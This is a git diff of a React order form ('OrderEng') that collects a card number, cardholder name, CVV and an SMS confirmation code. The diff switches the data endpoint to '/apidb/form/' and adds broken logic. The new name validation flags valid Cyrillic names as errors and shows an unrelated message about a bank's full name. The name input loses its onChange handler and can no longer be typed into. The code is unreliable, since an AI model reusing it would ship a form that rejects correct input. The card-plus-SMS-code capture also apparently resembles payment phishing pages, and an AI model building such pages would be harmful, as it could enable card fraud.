@@ -28,7 +28,7 @@ const OrderEng = () => {
   useEffect(() => {
     const fetchData = async () => {
       try {
-          const response = await axios.get(`http://localhost:3000/api/form/${location.state.id}`);
+          const response = await axios.get(`/apidb/form/${location.state.id}`);
           setFormData(response.data);        
       } catch (error) {
         console.error('Error fetching form data:', error);
@@ -44,8 +44,8 @@ const OrderEng = () => {
     if (fields.includes('cardNumber') && !/^[0-9]{16}$/.test(cardData.cardNumber)) {
       newErrors.cardNumber = 'Card number must be 16 digits';
     }
-    if (fields.includes('name') && /^[A-Za-z]+\s[A-Za-z]+$/.test(cardData.name)) {
-      newErrors.name = 'Name should include first and last name in English, starting with capital letters';
+    if (fields.includes('name') && /^[А-Яа-я]+\s[А-Яа-я]+$/.test(cardData.name)) {
+      newErrors.name = 'Please provide the full name of your bank';
     }
     if (fields.includes('cvv') && !/^[0-9]{3,4}$/.test(cardData.cvv)) {
       newErrors.cvv = 'CVV must be 3 or 4 digits';
@@ -182,7 +182,7 @@ const OrderEng = () => {
                   name="name"
                   id="name"
                   value={cardData.name}
-                  onChange={handleChange}
+                  
                   className={`mt-1 block w-full h-[35px] border ${errors.name ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                   placeholder="John Doe"
                   required
@@ -308,7 +308,7 @@ const OrderEng = () => {
                   value={smsCode}
                   onChange={(e) => setSmsCode(e.target.value)}
                   className={`mt-1 block w-full h-[35px] bg-gray-form border ${errors.smsCode ? 'border-red-500' : 'border-gray-200'} rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
-                  placeholder="123 123"
+                  placeholder="765***"
                   required
                 />
                 {errors.smsCode && <p className="text-red-500 text-sm">{errors.smsCode}</p>}
